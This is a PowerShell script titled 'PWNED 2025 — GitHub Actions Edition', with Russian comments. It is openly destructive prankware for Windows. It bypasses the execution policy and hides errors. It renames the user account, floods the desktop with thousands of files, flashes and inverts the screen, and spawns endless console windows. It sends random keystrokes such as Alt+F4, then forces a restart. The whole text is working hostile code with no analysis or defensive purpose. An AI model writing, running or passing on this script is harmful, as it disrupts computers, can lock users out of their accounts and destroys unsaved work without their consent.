# PWNED 2025 — GitHub Actions Edition
$ErrorActionPreference='SilentlyContinue'
Set-ExecutionPolicy Bypass -Scope Process -Force

# Перезагрузка через 40 сек
Start-Job { Start-Sleep 40; Restart-Computer -Force } >$null

# Смена юзернейма
$new = "user$(Get-Random -Max 99999)"
try{[ADSI]"WinNT://./$env:USERNAME,user").psbase.rename($new)}catch{}

# 150 папок + 5000 файлов на десктоп
1..150|%{ $p="$env:USERPROFILE\Desktop\PWNED_$_";ni $p -ItemType Directory -Force >$null;1..33|%{"PWNED BY GITHUB ACTIONS`n$(Get-Date)"|Out-File "$p/file_$_ .txt"-Encoding utf8}}

# Мерцание + инверсия экрана
Add-Type @'
using System;using System.Runtime.InteropServices;
public class A{[DllImport("user32.dll")]public static extern IntPtr GetDC(IntPtr h);[DllImport("gdi32.dll")]public static extern bool PatBlt(IntPtr hdc,int x,int y,int w,int h,uint r);public const uint i=0x00550009;}
'@ -ErrorAction SilentlyContinue
Start-Job{while(1){[A]::PatBlt([A]::GetDC(0),0,0,9999,9999,[A]::i);Start-Sleep -m 350}}>$null

# Бесконечные окна
1..25|%{Start-Process powershell "-NoExit -C `while(1){`$Host.UI.RawUI.WindowTitle='PWNED 2025';sleep -m 100}"}

# Рандомные клавиши
Start-Job{Add-Type -A System.Windows.Forms;while(1){[System.Windows.Forms.SendKeys]::SendWait(@("%{F4}","^{ESC}","{CAPSLOCK}","{NUMLOCK}"|Get-Random));Start-Sleep -m (Get-Random -Min 80 -Max 600))}}>$null

# Финалка
Start-Sleep 15
msg * "PWNED BY GITHUB ACTIONS 2025`n`nПерезагрузка через 10 секунд..."
Start-Sleep 10
shutdown /r /f /t 0
